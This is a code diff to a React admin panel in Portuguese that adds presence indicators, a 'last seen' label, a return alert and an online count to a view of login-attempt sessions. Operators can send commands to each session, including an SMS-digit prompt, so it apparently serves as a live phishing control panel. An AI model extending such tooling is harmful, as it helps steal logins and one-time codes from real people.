@@ -1,4 +1,4 @@
-import { useEffect, useState, type FormEvent } from 'react';
+import { useEffect, useRef, useState, type FormEvent } from 'react';
 import { useAdminPresence } from '../lib/presence';
 import {
   Activity,
@@ -194,6 +194,18 @@ const timeAgo = (iso: string) => {
   const h = Math.floor(m / 60);
   if (h < 24) return `${h}h atrás`;
   return `${Math.floor(h / 24)}d atrás`;
+};
+
+// Rótulo curto de "última presença" (aceita segundos) para sessões Offline.
+const lastSeenLabel = (ms: number) => {
+  const s = Math.floor((Date.now() - ms) / 1000);
+  if (s < 10) return 'agora mesmo';
+  if (s < 60) return `há ${s}s`;
+  const m = Math.floor(s / 60);
+  if (m < 60) return `há ${m} min`;
+  const h = Math.floor(m / 60);
+  if (h < 24) return `há ${h}h`;
+  return `há ${Math.floor(h / 24)}d`;
 };
 
 function AccessDetailModal({ item, onClose }: { item: AccessItem; onClose: () => void }) {
@@ -510,6 +522,7 @@ function SessionBlock({
   session,
   expanded,
   online,
+  lastSeen,
   onToggle,
   onCommand,
   onDelete,
@@ -518,6 +531,7 @@ function SessionBlock({
   session: LoginSession;
   expanded: boolean;
   online: boolean;
+  lastSeen?: number;
   onToggle: () => void;
   onCommand: (id: string, command: string, smsLast3?: string) => void;
   onDelete: (id: string) => void;
@@ -527,9 +541,26 @@ function SessionBlock({
   const [smsOpen, setSmsOpen] = useState(false);
   const [smsDigits, setSmsDigits] = useState('');
   const [smsSent, setSmsSent] = useState<string | null>(null);
+  // Alerta de retorno: pulsa o card quando o usuário volta a ficar Online.
+  const [returned, setReturned] = useState(false);
+  const prevOnline = useRef(online);
+  useEffect(() => {
+    if (!prevOnline.current && online) {
+      setReturned(true);
+      const t = window.setTimeout(() => setReturned(false), 4500);
+      prevOnline.current = online;
+      return () => window.clearTimeout(t);
+    }
+    prevOnline.current = online;
+  }, [online]);
 
   return (
-    <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
+    <div
+      className={`donas-session${ended ? ' is-ended' : ''}${
+        returned && online ? ' is-returned' : ''
+      }`}
+      data-testid="session-block"
+    >
       <div className="donas-session-headwrap">
         <button type="button" className="donas-session-head" onClick={onToggle} data-testid="session-head">
           <span className={`donas-flow-badge donas-flow-badge--${session.flowType ?? 'NA'}`}>
@@ -541,12 +572,18 @@ function SessionBlock({
           </span>
           <span className="donas-session-tags">
             <span
-              className={`donas-presence donas-presence--${online ? 'online' : 'offline'}`}
+              className={`donas-presence donas-presence--${online ? 'online' : 'offline'}${
+                returned && online ? ' is-returned' : ''
+              }`}
               title={online ? 'Online — usuário com o site ativo' : 'Offline — usuário ausente'}
               data-testid={`session-presence-${online ? 'online' : 'offline'}`}
             >
               <span className="donas-presence-dot" aria-hidden="true" />
-              {online ? 'Online' : 'Offline'}
+              {online
+                ? 'Online'
+                : lastSeen
+                  ? `Offline · visto ${lastSeenLabel(lastSeen)}`
+                  : 'Offline'}
             </span>
             <span className={`donas-status donas-status--${ended ? 'failed' : 'submitted'}`}>
               {ended ? 'encerrada' : 'ativa'}
@@ -827,6 +864,7 @@ function TentativasView() {
         [s.identifier, s.currentStep, s.ip, s.browser, s.flowType, s.status].some((v) =>
           (v ?? '').toLowerCase().includes(term)))
     : items;
+  const onlineCount = filtered.filter((s) => presence.online[s.sessionId]).length;
 
   return (
     <div className="donas-acessos" data-testid="tentativas-view">
@@ -839,6 +877,14 @@ function TentativasView() {
           data-testid="tentativas-search"
         />
         <span className="donas-mini-btn" style={{ cursor: 'default' }}>{filtered.length} sessões</span>
+        <span
+          className="donas-online-count"
+          title="Usuários com o site ativo agora"
+          data-testid="online-count"
+        >
+          <span className="donas-presence-dot" aria-hidden="true" />
+          {onlineCount} online
+        </span>
         <button
           type="button"
           className="donas-tool-btn"
@@ -865,7 +911,8 @@ function TentativasView() {
             key={s.id}
             session={s}
             expanded={expandedId === s.id}
-            online={presence[s.sessionId] ?? false}
+            online={presence.online[s.sessionId] ?? false}
+            lastSeen={presence.lastSeen[s.sessionId]}
             onToggle={() => setExpandedId(expandedId === s.id ? null : s.id)}
             onCommand={sendCommand}
             onDelete={deleteOne}
